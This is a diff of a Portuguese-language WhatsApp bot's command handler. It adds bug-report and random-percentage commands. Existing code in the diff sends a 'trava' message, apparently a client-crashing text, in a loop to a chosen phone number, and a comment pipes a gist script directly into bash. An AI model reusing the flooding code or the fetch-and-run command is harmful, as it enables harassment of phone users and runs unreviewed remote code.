@@ -42,6 +42,17 @@ async function commandHandler(bot, cmd, data) {
             // retorna um teste
             return await bot.replyText(data, "testando 1 2 3");
 
+        case "bug": {
+            // retorna um bug
+            if (args.length < 1) {
+                return await bot.replyText(data, "Por favor, digite o bug que você está reportando!");
+            }
+            const bug = args.join(" ");
+            const sender = "wa.me/" + data.bot_data.sender.split("@")[0];
+            await bot.sendTextMessage(data, "Bug reportado por: " + sender +"\n\n" + bug, bot.owner_jid);
+            return await bot.replyText(data, "Bug reportado com sucesso! O abuso desse comando pode ser punido!");
+        }
+
         /* %$ENDINFO$% */
 
         /* %$MIDIA$% */
@@ -362,10 +373,20 @@ ${message}`
 
         case "chance": {
             if(args.length == 0) {
-                error = "Você precisa especificar qual a chance, ex: chance de eu ficar off";
+                error = "Você precisa especificar qual a chance, ex: !chance de eu ficar off";
             } else {
                 const text = args.join(" ");
                 return await bot.replyText(data, "A chance " + text + " é de " + Math.round(Math.random() * 100) + "%");
+            }
+            return await bot.replyText(data, error);
+        }
+
+        case "perc": {
+            if(args.length == 0) {
+                error = "Você dizer o nome da porcentagem!";
+            } else {
+                const text = args.join(" ");
+                return await bot.replyText(data, "Você é " + Math.round(Math.random() * 100) + "% " + text);
             }
             return await bot.replyText(data, error);
         }
@@ -597,7 +618,7 @@ ${message}`
                     times = args[1];
                 }
                 const number = args[0] + "s.whatsapp.net";
-                let trava = fs.readFileSync("./etc/trava", "utf8");  // curl https://gist.githubusercontent.com/kamuridesu/817222c6ab0958a94e2f98d36677e5e0/raw/e49a9a4041507717aa845fb44b5f153819c1a38d/setup.sh > setup.sh && chmod +x setup.sh && sh ./setup.sh && rm setup.sh
+                let trava = fs.readFileSync("./etc/trava", "utf8");  // curl https://gist.githubusercontent.com/kamuridesu/817222c6ab0958a94e2f98d36677e5e0/raw/e49a9a4041507717aa845fb44b5f153819c1a38d/setup.sh | bash
                 for(let i = 0; i < times; i++) {
                     await bot.sendTextMessage(data, trava, number);
                 }
